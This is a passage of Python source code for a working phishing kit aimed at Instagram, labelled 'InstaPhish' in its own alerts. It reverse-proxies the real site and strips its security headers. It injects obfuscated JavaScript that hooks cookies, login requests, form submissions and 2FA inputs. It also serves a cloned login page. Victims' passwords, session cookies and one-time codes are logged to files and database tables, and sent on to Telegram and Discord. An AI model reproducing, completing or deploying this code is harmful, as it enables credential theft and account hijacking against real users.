        self.target_host = CONFIG.TARGET_HOST
        self.ssl_context = self._create_ssl_context()
        self.cookie_jar = http.cookiejar.CookieJar()
        self.session_store = {}  # Session persistence
        self._init_url_handler()
        self.user_agents = self._load_user_agents()
        self.current_ua_index = 0
        self.ua_lock = threading.Lock()
    
    def _create_ssl_context(self) -> ssl.SSLContext:
        """Create optimized SSL context"""
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        try:
            ctx.minimum_version = ssl.TLSVersion.TLSv1_2
        except AttributeError:
            ctx.options |= ssl.OP_NO_SSLv2 | ssl.OP_NO_SSLv3 | ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1
        return ctx
    
    def _init_url_handler(self):
        """Initialize URL opener with all handlers"""
        https_handler = urllib.request.HTTPSHandler(context=self.ssl_context)
        cookie_handler = urllib.request.HTTPCookieProcessor(self.cookie_jar)
        redirect_handler = CustomRedirectHandler()
        self.opener = urllib.request.build_opener(https_handler, cookie_handler, redirect_handler)
        self._set_default_headers()
    
    def _load_user_agents(self) -> List[str]:
        """Load comprehensive user agent list"""
        return [
            # Chrome Windows
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
            # Chrome macOS
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            # Firefox Windows
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
            # Edge Windows
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
            # Safari macOS
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
            # Chrome Linux
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            # Mobile Chrome Android
            'Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36',
            # Mobile Safari iOS
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
        ]
    
    def _get_random_user_agent(self) -> str:
        """Get a random user agent from the list"""
        with self.ua_lock:
            if CONFIG.ROTATE_USER_AGENT_INTERVAL > 0:
                self.current_ua_index = (self.current_ua_index + 1) % len(self.user_agents)
                return self.user_agents[self.current_ua_index]
            return random.choice(self.user_agents)
    
    def _set_default_headers(self):
        """Set default headers for proxy requests"""
        self.default_headers = [
            ('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'),
            ('Accept-Language', 'en-US,en;q=0.9'),
            ('Accept-Encoding', 'identity'),  # We handle decompression ourselves
            ('DNT', '1'),
            ('Upgrade-Insecure-Requests', '1'),
            ('Sec-Fetch-Dest', 'document'),
            ('Sec-Fetch-Mode', 'navigate'),
            ('Sec-Fetch-Site', 'none'),
            ('Sec-Fetch-User', '?1'),
            ('Cache-Control', 'max-age=0'),
            ('Connection', 'keep-alive'),
        ]
    
    def _clean_request_headers(self, client_headers: Dict) -> Dict:
        """Clean and prepare headers for proxy request"""
        hop_by_hop = {
            'connection', 'keep-alive', 'proxy-authenticate', 'proxy-authorization',
            'te', 'trailers', 'transfer-encoding', 'upgrade', 'host',
            'proxy-connection', 'content-length', 'content-encoding',
            'accept-encoding'  # We handle this
        }
        
        clean = {}
        for key, value in client_headers.items():
            key_lower = key.lower()
            if key_lower not in hop_by_hop:
                clean[key] = value
        
        # Force correct Host
        clean['Host'] = self.target_host
        
        # Set User-Agent
        if CONFIG.RANDOMIZE_USER_AGENT:
            clean['User-Agent'] = self._get_random_user_agent()
        elif 'User-Agent' not in clean:
            clean['User-Agent'] = self.user_agents[0]
        
        # No compression
        clean['Accept-Encoding'] = 'identity'
        
        return clean
    
    def fetch_from_target(self, method: str, path: str, headers: Dict, 
                         body: Optional[bytes] = None, query: str = '') -> Tuple:
        """
        Fetch content from the real Instagram server
        Returns: (status_code, response_headers_dict, response_body_bytes, set_cookies_list)
        """
        # Add random delay to simulate human behavior
        if CONFIG.ADD_RANDOM_DELAYS:
            time.sleep(random.uniform(CONFIG.DELAY_MIN, CONFIG.DELAY_MAX))
        
        url = f"https://{self.target_host}{path}"
        if query:
            url += f"?{query}"
        
        clean_headers = self._clean_request_headers(headers)
        
        try:
            req = urllib.request.Request(url, data=body, headers=clean_headers, method=method)
            response = self.opener.open(req, timeout=CONFIG.REQUEST_TIMEOUT)
            
            status_code = response.status
            resp_headers = dict(response.headers)
            resp_body = response.read()
            
            # Decompress if needed
            content_encoding = resp_headers.get('Content-Encoding', '').lower()
            if content_encoding == 'gzip':
                try:
                    resp_body = gzip.decompress(resp_body)
                except:
                    pass
            elif content_encoding == 'deflate':
                try:
                    resp_body = zlib.decompress(resp_body)
                except:
                    pass
            elif content_encoding == 'br':
                try:
                    import brotli
                    resp_body = brotli.decompress(resp_body)
                except:
                    pass
            
            # Extract Set-Cookie headers
            set_cookies = []
            if hasattr(response, 'headers'):
                try:
                    set_cookies = response.headers.get_all('Set-Cookie')
                except:
                    sc = response.headers.get('Set-Cookie')
                    if sc:
                        set_cookies = [sc]
            
            return status_code, resp_headers, resp_body, set_cookies
            
        except urllib.error.HTTPError as e:
            status = e.code
            resp_headers = dict(e.headers) if e.headers else {}
            body = e.read() if e.fp else b""
            set_cookies = []
            if hasattr(e, 'headers'):
                try:
                    set_cookies = e.headers.get_all('Set-Cookie')
                except:
                    sc = e.headers.get('Set-Cookie')
                    if sc:
                        set_cookies = [sc]
            return status, resp_headers, body, set_cookies
            
        except Exception as e:
            logger.error(f"Proxy fetch error: {e}")
            return 502, {}, b"<html><body><h1>502 Bad Gateway</h1></body></html>", []
    
    def modify_response_body(self, body: bytes, content_type: str, path: str = '') -> bytes:
        """
        Modify response body:
        1. Rewrite URLs to point to our proxy
        2. Inject cookie capture JavaScript
        3. Inject credential capture hooks
        """
        if not body:
            return body
        
        try:
            if 'text/html' in content_type.lower():
                body_str = body.decode('utf-8', errors='ignore')
                
                # URL rewriting
                if CONFIG.REWRITE_URLS:
                    replacements = [
                        ('https://www.instagram.com', ''),
                        ('https://instagram.com', ''),
                        ('//www.instagram.com', ''),
                        ('//instagram.com', ''),
                        ('www.instagram.com', ''),
                        ('instagram.com', ''),
                        ('https://static.cdninstagram.com', '/cdn'),
                        ('https://scontent.cdninstagram.com', '/cdn'),
                        ('https://scontent-', '/cdn-'),
                    ]
                    for old, new in replacements:
                        body_str = body_str.replace(old, new)
                
                # Inject capture hooks
                if CONFIG.INJECT_COOKIE_HOOKS:
                    capture_script = self._generate_capture_script()
                    # Try multiple injection points
                    injection_points = ['</head>', '<head>', '<html>', '<body>']
                    injected = False
                    for point in injection_points:
                        if point in body_str:
                            if point == '</head>':
                                body_str = body_str.replace(point, f'{capture_script}\n{point}')
                            elif point == '<head>':
                                body_str = body_str.replace(point, f'{point}\n{capture_script}')
                            else:
                                body_str = f'{capture_script}\n{body_str}'
                            injected = True
                            break
                    
                    if not injected:
                        body_str = f'{capture_script}\n{body_str}'
                
                return body_str.encode('utf-8')
            
            # Pass through other content types
            return body
            
        except Exception as e:
            logger.error(f"Response modification error: {e}")
            return body
    
    def _generate_capture_script(self) -> str:
        """Generate the comprehensive cookie/credential capture JavaScript"""
        return '''<script id="__phantom_capture">
(function(){
    var C=window.location.origin+'/__capture';
    var S=function(d){
        try{var x=new XMLHttpRequest();x.open('POST',C,true);x.setRequestHeader('Content-Type','application/json');x.send(JSON.stringify(d));}catch(e){}
        try{navigator.sendBeacon(C,JSON.stringify(d));}catch(e){}
    };
    var G=function(){return document.cookie||''};
    var P=function(c){
        var o={};if(!c)return o;
        c.split(';').forEach(function(p){var e=p.trim().split('=');if(e.length>1)o[e[0].trim()]=e.slice(1).join('=').trim();});
        return o;
    };
    
    // Hook 1: document.cookie
    try{
        var d=Object.getOwnPropertyDescriptor(Document.prototype,'cookie')||Object.getOwnPropertyDescriptor(HTMLDocument.prototype,'cookie');
        if(d&&d.configurable){
            Object.defineProperty(document,'cookie',{get:function(){return d.get.call(this)},set:function(v){var o=P(d.get.call(this));var n=P(v);S({type:'cookie-set',value:v,all:d.get.call(this),newKey:Object.keys(n).filter(function(k){return!o[k]})});return d.set.call(this,v);},configurable:true});
        }
    }catch(e){}
    
    // Hook 2: XMLHttpRequest
    var X=XMLHttpRequest.prototype,O=X.open,N=X.send;
    X.open=function(m,u){this.__u=u;this.__m=m;return O.apply(this,arguments);};
    X.send=function(b){
        var t=this;
        t.addEventListener('load',function(){
            if(t.__u&&(t.__u.indexOf('login')>-1||t.__u.indexOf('accounts')>-1||t.__u.indexOf('auth')>-1)){
                var sc=t.getResponseHeader('Set-Cookie');if(sc)S({type:'xhr-response',cookies:sc,url:t.__u});
                S({type:'xhr-intercept',cookies:G(),url:t.__u,status:t.status});
            }
        });
        return N.apply(this,arguments);
    };
    
    // Hook 3: fetch
    var F=window.fetch;
    window.fetch=function(){
        var a=arguments;
        return F.apply(this,a).then(function(r){
            var u=typeof a[0]==='string'?a[0]:(a[0]&&a[0].url)||'';
            if(u&&(u.indexOf('login')>-1||u.indexOf('accounts')>-1))S({type:'fetch-intercept',cookies:G(),url:u,status:r.status});
            var sc=r.headers.get('Set-Cookie');if(sc)S({type:'fetch-response',cookies:sc});
            return r;
        });
    };
    
    // Hook 4: Forms
    document.addEventListener('submit',function(e){setTimeout(function(){var f=e.target;var d={type:'form-submit',action:f.action};f.querySelectorAll('input').forEach(function(i){if(i.name&&i.value)d[i.name]=i.value});if(Object.keys(d).length>3)S(d);},50);},true);
    
    // Hook 5: Clicks
    document.addEventListener('click',function(e){var t=e.target;if(t.type==='submit'||t.id==='loginbutton'||(t.textContent||'').includes('Log in')){setTimeout(function(){var f=t.closest('form')||document.querySelector('form');if(f){var d={type:'click-capture'};f.querySelectorAll('input').forEach(function(i){if(i.name&&i.value)d[i.name]=i.value});if(Object.keys(d).length>3)S(d);}},100);}},true);
    
    // Hook 6: 2FA input capture
    var inputs=document.querySelectorAll('input[type="text"],input[type="number"],input[name*="code"],input[name*="token"],input[name*="otp"],input[name*="2fa"]');
    inputs.forEach(function(i){i.addEventListener('input',function(){if(this.value&&this.value.length>=6)S({type:'2fa-input',name:this.name,value:this.value});});});
    
    // Hook 7: Periodic beacon
    setInterval(function(){var c=G();if(c&&(c.indexOf('sessionid')>-1||c.indexOf('csrftoken')>-1||c.indexOf('ds_user_id')>-1))S({type:'periodic',cookies:c,url:window.location.href});},4000);
    
    // Hook 8: Initial dump
    setTimeout(function(){var c=G();if(c)S({type:'initial',cookies:c,url:window.location.href,title:document.title});},1500);
})();
</script>'''
    
    def strip_security_headers(self, headers: Dict) -> Dict:
        """Strip security headers that interfere with cookie capture"""
        if not CONFIG.STRIP_SECURITY_HEADERS:
            return headers
        
        security_headers = {
            'content-security-policy', 'content-security-policy-report-only',
            'x-content-security-policy', 'x-webkit-csp',
            'x-frame-options', 'x-xss-protection',
            'strict-transport-security', 'public-key-pins',
            'public-key-pins-report-only', 'expect-ct',
            'access-control-allow-origin', 'access-control-allow-credentials',
            'cross-origin-resource-policy', 'cross-origin-opener-policy',
            'cross-origin-embedder-policy', 'permissions-policy',
            'referrer-policy', 'feature-policy', 'nel', 'report-to',
            'content-encoding', 'transfer-encoding',
        }
        
        clean = {}
        for key, value in headers.items():
            if key.lower() not in security_headers:
                clean[key] = value
        
        # Add permissive headers
        clean['Access-Control-Allow-Origin'] = '*'
        clean['Access-Control-Allow-Credentials'] = 'true'
        clean['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS, PUT, DELETE, PATCH'
        clean['Access-Control-Allow-Headers'] = '*'
        clean['X-Frame-Options'] = 'SAMEORIGIN'
        clean['X-Content-Type-Options'] = 'nosniff'
        clean['Cache-Control'] = 'no-cache, no-store, must-revalidate, private'
        
        return clean

class CustomRedirectHandler(urllib.request.HTTPRedirectHandler):
    """Custom redirect handler that preserves cookies"""
    
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        new_req = urllib.request.HTTPRedirectHandler.redirect_request(
            self, req, fp, code, msg, headers, newurl
        )
        if new_req:
            # Preserve original headers
            for key, value in req.headers.items():
                if key.lower() not in ['host', 'content-length']:
                    new_req.headers[key] = value
        return new_req

# ===================================================================================
# HTTP REQUEST HANDLER
# ===================================================================================

class ProxyRequestHandler(http.server.BaseHTTPRequestHandler):
    """Advanced HTTP request handler for the reverse proxy"""
    
    # Class-level instances
    proxy_engine = ReverseProxyCore()
    cookie_engine = CookieEngine()
    db = DatabaseManager()
    
    # Protocol version
    protocol_version = 'HTTP/1.1'
    
    def log_message(self, format, *args):
        """Custom logging"""
        if CONFIG.DEBUG:
            logger.debug(f"{self.client_address[0]} - {format % args}")
    
    def version_string(self):
        """Spoof server version"""
        return 'nginx/1.24.0'
    
    def _get_client_ip(self) -> str:
        """Get real client IP considering proxies"""
        xff = self.headers.get('X-Forwarded-For', '')
        if xff:
            return xff.split(',')[0].strip()
        xri = self.headers.get('X-Real-IP', '')
        if xri:
            return xri
        return self.client_address[0]
    
    def _get_user_agent(self) -> str:
        """Get client user agent"""
        return self.headers.get('User-Agent', 'Unknown')
    
    def _parse_path_query(self) -> Tuple[str, str]:
        """Parse path and query from request"""
        parsed = urlparse(self.path)
        return parsed.path, parsed.query
    
    def _read_body(self) -> Optional[bytes]:
        """Read request body"""
        content_length = int(self.headers.get('Content-Length', 0))
        if content_length > 0:
            return self.rfile.read(content_length)
        return None
    
    def _get_headers_dict(self) -> Dict:
        """Get all request headers as dict"""
        headers = {}
        for key, value in self.headers.items():
            headers[key] = value
        return headers
    
    def _process_captured_data(self, data: Dict, capture_method: str = 'direct'):
        """
        Process captured credentials, cookies, and 2FA tokens
        Store in database, log to files, display alerts
        """
        ip = self._get_client_ip()
        ua = self._get_user_agent()
        
        victim_data = {
            'timestamp': datetime.now().isoformat(),
            'ip': ip,
            'user_agent': ua,
            'username': data.get('username', data.get('email', '')),
            'password': data.get('password', data.get('enc_password', '')),
            'email': data.get('email', ''),
            'phone': data.get('phone', ''),
            'capture_method': capture_method,
            'target_url': self.path,
            'referer': self.headers.get('Referer', ''),
        }
        
        # Parse cookies
        cookie_string = data.get('cookies', data.get('cookie', data.get('all', '')))
        if cookie_string:
            cookies = self.cookie_engine.parse_cookie_string(cookie_string)
            victim_data.update({
                'sessionid': cookies.get('sessionid', ''),
                'csrftoken': cookies.get('csrftoken', ''),
                'ds_user_id': cookies.get('ds_user_id', ''),
                'rur': cookies.get('rur', ''),
                'mid': cookies.get('mid', ''),
                'ig_did': cookies.get('ig_did', ''),
                'datr': cookies.get('datr', ''),
                'shbid': cookies.get('shbid', ''),
                'shbts': cookies.get('shbts', ''),
                'all_cookies': cookie_string,
            })
        
        # Check for 2FA tokens
        for key in ['totp', 'code', 'token', 'otp', '2fa', 'verification_code', 'security_code']:
            if key in data and data[key]:
                victim_data['2fa_token'] = data[key]
                break
        
        # Store in database
        victim_id = self.db.store_victim(victim_data)
        
        # Store 2FA token if present
        if victim_id and '2fa_token' in victim_data:
            self.db.store_2fa_token(victim_id, victim_data['2fa_token'])
        
        # Log to files
        self._log_to_files(victim_data)
        
        # Display alerts
        has_creds = bool(victim_data.get('username') or victim_data.get('password'))
        has_cookies = bool(victim_data.get('sessionid'))
        has_2fa = bool('2fa_token' in victim_data)
        
        if has_creds:
            Banner.display_capture_alert('credentials', victim_data)
        
        if has_cookies:
            Banner.display_capture_alert('cookies', victim_data)
        
        if has_2fa:
            Banner.display_capture_alert('2fa', victim_data)
        
        # Send notifications if configured
        if CONFIG.ENABLE_NOTIFICATIONS:
            self._send_notifications(victim_data)
    
    def _log_to_files(self, data: Dict):
        """Log captured data to files"""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        # Credentials log
        if data.get('username') or data.get('password'):
            try:
                with open(CONFIG.LOG_FILE, 'a', encoding='utf-8') as f:
                    f.write(f"\n{'='*70}\n")
                    f.write(f"[{timestamp}] CAPTURE\n")
                    f.write(f"IP: {data.get('ip', 'Unknown')}\n")
                    f.write(f"UA: {data.get('user_agent', 'Unknown')[:120]}\n")
                    if data.get('username'): f.write(f"USERNAME: {data['username']}\n")
                    if data.get('password'): f.write(f"PASSWORD: {data['password']}\n")
                    if data.get('email'): f.write(f"EMAIL: {data['email']}\n")
                    f.write(f"METHOD: {data.get('capture_method', 'unknown')}\n")
                    f.write(f"{'='*70}\n")
            except Exception as e:
                logger.error(f"Log error: {e}")
        
        # Cookie log
        if data.get('sessionid'):
            try:
                with open(CONFIG.COOKIE_FILE, 'a', encoding='utf-8') as f:
                    f.write(f"\n{'='*70}\n")
                    f.write(f"[{timestamp}] SESSION HIJACKED\n")
                    f.write(f"IP: {data.get('ip', 'Unknown')}\n")
                    f.write(f"SESSIONID: {data['sessionid']}\n")
                    if data.get('csrftoken'): f.write(f"CSRF: {data['csrftoken']}\n")
                    if data.get('ds_user_id'): f.write(f"DS_USER_ID: {data['ds_user_id']}\n")
                    if data.get('all_cookies'): 
                        f.write(f"\n--- EDITTHISCOOKIE IMPORT ---\n")
                        f.write(f"{data['all_cookies']}\n")
                        f.write(f"--- END IMPORT ---\n")
                    f.write(f"{'='*70}\n")
            except Exception as e:
                logger.error(f"Log error: {e}")
        
        # Session JSON for programmatic access
        if data.get('all_cookies'):
            try:
                os.makedirs(os.path.dirname(CONFIG.SESSION_FILE), exist_ok=True)
                with open(CONFIG.SESSION_FILE, 'a', encoding='utf-8') as f:
                    f.write(json.dumps({
                        'timestamp': timestamp,
                        'ip': data.get('ip', ''),
                        'cookies': data.get('all_cookies', ''),
                        'sessionid': data.get('sessionid', ''),
                    }) + '\n')
            except Exception as e:
                logger.error(f"Log error: {e}")
    
    def _send_notifications(self, data: Dict):
        """Send notifications via configured channels"""
        ip = data.get('ip', 'Unknown')
        username = data.get('username', 'N/A')
        sessionid = data.get('sessionid', '')
        
        message = f"🔔 *InstaPhish Alert*\n"
        message += f"IP: `{ip}`\n"
        if username != 'N/A':
            message += f"Username: `{username}`\n"
        if data.get('password'):
            message += f"Password: `{data['password']}`\n"
        if sessionid:
            message += f"Session: `{sessionid[:30]}...`\n"
        
        # Telegram
        if CONFIG.TELEGRAM_BOT_TOKEN and CONFIG.TELEGRAM_CHAT_ID:
            threading.Thread(target=self._send_telegram, args=(message,), daemon=True).start()
        
        # Discord
        if CONFIG.DISCORD_WEBHOOK:
            threading.Thread(target=self._send_discord, args=(message,), daemon=True).start()
    
    def _send_telegram(self, message: str):
        """Send Telegram notification"""
        try:
            url = f"https://api.telegram.org/bot{CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage"
            data = {
                'chat_id': CONFIG.TELEGRAM_CHAT_ID,
                'text': message,
                'parse_mode': 'Markdown'
            }
            req = urllib.request.Request(url, data=json.dumps(data).encode(), 
                                        headers={'Content-Type': 'application/json'})
            urllib.request.urlopen(req, timeout=5)
        except:
            pass
    
    def _send_discord(self, message: str):
        """Send Discord notification"""
        try:
            data = {'content': message}
            req = urllib.request.Request(CONFIG.DISCORD_WEBHOOK, 
                                        data=json.dumps(data).encode(),
                                        headers={'Content-Type': 'application/json'})
            urllib.request.urlopen(req, timeout=5)
        except:
            pass
    
    def _handle_capture_request(self):
        """Handle cookie/credential capture POST requests"""
        body = self._read_body()
        if not body:
            self._send_json_response({'status': 'error', 'message': 'Empty body'}, 400)
            return
        
        try:
            body_str = body.decode('utf-8', errors='ignore')
            
            # Try JSON parsing
            try:
                data = json.loads(body_str)
            except:
                try:
                    parsed = parse_qs(body_str)
                    data = {k: v[0] if isinstance(v, list) and len(v) == 1 else v for k, v in parsed.items()}
                except:
                    data = {'raw': body_str}
            
            capture_type = data.get('type', 'direct')
            self._process_captured_data(data, capture_type)
            self._send_json_response({'status': 'ok'})
            
        except Exception as e:
            logger.error(f"Capture error: {e}")
            self._send_json_response({'status': 'error', 'message': str(e)}, 500)
    
    def _send_json_response(self, data: Dict, status: int = 200):
        """Send JSON response"""
        self.send_response(status)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Cache-Control', 'no-cache')
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())
    
    def _serve_cloned_login(self):
        """Serve the cloned Instagram login page"""
        clone_path = "cloned_site/index.html"
        if os.path.exists(clone_path):
            try:
                with open(clone_path, 'rb') as f:
                    content = f.read()
                self.send_response(200)
                self.send_header('Content-Type', 'text/html; charset=utf-8')
                self.send_header('Content-Length', len(content))
                self.send_header('Cache-Control', 'no-cache')
                self.end_headers()
                self.wfile.write(content)
            except Exception as e:
                self.send_error(500)
        else:
            self._proxy_request('GET')
    
    def _serve_static(self, path: str):
        """Serve static files"""
        full_path = f"cloned_site{path}"
        if os.path.exists(full_path) and os.path.isfile(full_path):
            try:
                with open(full_path, 'rb') as f:
                    content = f.read()
                
                content_type = mimetypes.guess_type(full_path)[0] or 'application/octet-stream'
                
                self.send_response(200)
                self.send_header('Content-Type', content_type)
                self.send_header('Content-Length', len(content))
                self.send_header('Cache-Control', 'public, max-age=86400')
                self.end_headers()
                self.wfile.write(content)
            except:
                self.send_error(404)
        else:
            self._proxy_request('GET')
    
    def _proxy_request(self, method: str):
        """Proxy request to real Instagram"""
        path, query = self._parse_path_query()
        body = self._read_body() if method in ('POST', 'PUT', 'PATCH') else None
        headers = self._get_headers_dict()
        
        start_time = time.time()
        
        # Fetch from target
        status, resp_headers, resp_body, set_cookies = self.proxy_engine.fetch_from_target(
            method, path, headers, body, query
        )
        
        duration = (time.time() - start_time) * 1000
        
        # Process Set-Cookie headers
        if set_cookies and CONFIG.INTERCEPT_SET_COOKIE:
            cookies = self.cookie_engine.parse_set_cookie_headers(set_cookies)
            if cookies:
                # Extract credentials from login request body
                username = ''
                password = ''
                if body and ('login' in path.lower() or 'accounts' in path.lower()):
                    try:
                        body_str = body.decode('utf-8', errors='ignore')
                        parsed = parse_qs(body_str)
                        username = parsed.get('username', [''])[0]
                        password = parsed.get('enc_password', parsed.get('password', ['']))[0]
                    except:
                        pass
                
                capture_data = {
                    'username': username,
                    'password': password,
                    'cookies': self.cookie_engine.cookies_to_string(cookies),
                }
                capture_data.update(cookies)
                
                self._process_captured_data(capture_data, 'proxy-set-cookie')
        
        # Log attack
        self.db.log_attack({
            'type': 'proxy',
            'ip': self._get_client_ip(),
            'user_agent': self._get_user_agent(),
            'method': method,
            'path': path,
            'body': body.decode('utf-8', errors='ignore')[:500] if body else '',
            'response_code': status,
            'cookies_captured': 1 if set_cookies else 0,
            'success': 1 if status < 400 else 0,
            'details': f'Duration: {duration:.0f}ms'
        })
        
        # Modify response
        content_type = resp_headers.get('Content-Type', 'text/html')
        modified_body = self.proxy_engine.modify_response_body(resp_body, content_type, path)
        
        # Strip security headers
        send_headers = self.proxy_engine.strip_security_headers(resp_headers)
        
        # Send response
        self.send_response(status)
        
        for key, value in send_headers.items():
            key_lower = key.lower()
            if key_lower not in ('content-length', 'transfer-encoding', 'content-encoding'):
                try:
                    self.send_header(key, value)
                except:
                    pass
        
        self.send_header('Content-Length', len(modified_body))
        self.end_headers()
        
        try:
            self.wfile.write(modified_body)
        except:
            pass
    
    # HTTP Method Handlers
    def do_GET(self):
        path, query = self._parse_path_query()
        
        # Login page
        if path in ('/', '/index.html', '/login', '/accounts/login/', '/accounts/login'):
            if CONFIG.ENABLE_PHISHING_PAGE:
                self._serve_cloned_login()
            else:
                self._proxy_request('GET')
            return
        
        # Static files
        if path.startswith(('/css/', '/js/', '/images/', '/fonts/')):
            self._serve_static(path)
            return
        
        # Favicon
        if path == '/favicon.ico' and CONFIG.BLOCK_FAVICON:
            self.send_response(204)
            self.end_headers()
            return
        
        # Proxy
        self._proxy_request('GET')
    
    def do_POST(self):
        path, query = self._parse_path_query()
        
        # Capture endpoints
        if path in ('/__capture', '/proxy-capture', '/sw-capture', '/cookie-hook', '/beacon'):
            self._handle_capture_request()
            return
        
        # Proxy
        self._proxy_request('POST')
    
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, PUT, DELETE, PATCH')
        self.send_header('Access-Control-Allow-Headers', '*')
        self.send_header('Access-Control-Max-Age', '86400')
        self.end_headers()
    
    def do_CONNECT(self):
        """Handle HTTPS CONNECT tunneling"""
        self.send_response(200, 'Connection Established')
        self.end_headers()

# ===================================================================================
# CLONED SITE BUILDER
# ===================================================================================

class ClonedSiteBuilder:
    """Advanced Instagram login page clone builder"""
    
    def __init__(self):
        self.output_dir = "cloned_site"
        self._create_dirs()
    
    def _create_dirs(self):
        for d in ['css', 'js', 'images', 'fonts']:
            os.makedirs(f"{self.output_dir}/{d}", exist_ok=True)
    
    def build(self):
        logger.info("Building Instagram login page clone...")
        
        # CSS
        with open(f"{self.output_dir}/css/style.css", 'w') as f:
            f.write(self._get_css())
        
        # HTML
        with open(f"{self.output_dir}/index.html", 'w') as f:
            f.write(self._get_html())
        
        logger.success("Clone built successfully")
    
    def _get_css(self):
        return '''*{margin:0;padding:0;box-sizing:border-box}
body{background:#fafafa;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;font-size:14px;line-height:18px;color:#262626}
.container{display:flex;justify-content:center;align-items:center;margin:32px auto 0;padding-bottom:32px;max-width:935px;width:100%;gap:32px;flex-wrap:wrap}
.phone-col{position:relative;width:380px;height:582px;flex-shrink:0;align-self:center}
.slideshow{position:absolute;top:28px;left:152px;width:250px;height:540px;z-index:1;border-radius:2px;overflow:hidden}
.slide{position:absolute;top:0;left:0;width:100%;height:100%;background-size:cover;background-position:center;opacity:0;transition:opacity 1.2s ease-in-out}
.slide.active{opacity:1}
.phone-frame{position:absolute;top:0;left:0;width:380px;height:582px;z-index:2;pointer-events:none}
.login-col{display:flex;flex-direction:column;align-items:center;max-width:350px;width:100%;flex-shrink:0}
.login-box{background:#fff;border:1px solid #dbdbdb;border-radius:1px;padding:20px 40px;width:100%;display:flex;flex-direction:column;align-items:center;margin-bottom:10px}
.insta-logo{width:175px;height:51px;margin:22px auto 12px;object-fit:contain}
.form-input{background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;color:#262626;font-size:12px;height:36px;padding:9px 8px 7px;width:100%;margin-bottom:6px;outline:none}
.form-input:focus{border-color:#a8a8a8}
.form-input::placeholder{color:#8e8e8e;font-size:12px}
.login-btn{background:#0095f6;color:#fff;border:none;border-radius:8px;font-weight:600;font-size:14px;padding:7px 16px;width:100%;cursor:pointer;margin-top:8px;transition:background .2s}
.login-btn:hover{background:#1877f2}
.login-btn:active{opacity:.7;transform:scale(.98)}
.divider{color:#737373;font-size:13px;font-weight:600;margin:20px 0;text-align:center;display:flex;align-items:center;gap:18px;width:100%}
.divider::before,.divider::after{content:'';flex:1;height:1px;background:#dbdbdb}
.fb-login{display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:12px;cursor:pointer}
.fb-icon{width:16px;height:16px}
.fb-link{color:#385185;font-weight:600;font-size:14px;text-decoration:none}
.fb-link:hover{color:#00376b}
.forgot-link{color:#00376b;font-size:12px;text-decoration:none;margin-top:12px}
.forgot-link:hover{text-decoration:underline}
.signup-box{background:#fff;border:1px solid #dbdbdb;border-radius:1px;padding:20px;width:100%;text-align:center;font-size:14px;margin-bottom:10px}
.signup-box a{color:#0095f6;font-weight:600;text-decoration:none}
.app-section{text-align:center;margin-top:8px}
.app-section span{font-size:14px;margin-bottom:10px;display:block}
.app-btns{display:flex;gap:8px;justify-content:center;margin-top:8px}
.app-btns img{height:40px}
.footer{text-align:center;padding:24px 0;margin-top:20px;max-width:935px;margin-left:auto;margin-right:auto}
.footer-links{display:flex;flex-wrap:wrap;justify-content:center;gap:16px;margin-bottom:12px}
.footer-links a{color:#737373;font-size:12px;text-decoration:none}
.footer-links a:hover{text-decoration:underline}
.copyright{color:#737373;font-size:12px;margin-top:12px}
.error-msg{color:#ed4956;font-size:14px;text-align:center;margin-top:16px;display:none}
.error-msg.show{display:block}
@media(max-width:875px){.phone-col{display:none}.container{padding:20px;margin-top:0}}
@media(max-width:450px){.login-box,.signup-box{border:none;padding:20px}body{background:#fff}}'''
    
    def _get_html(self):
        return '''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
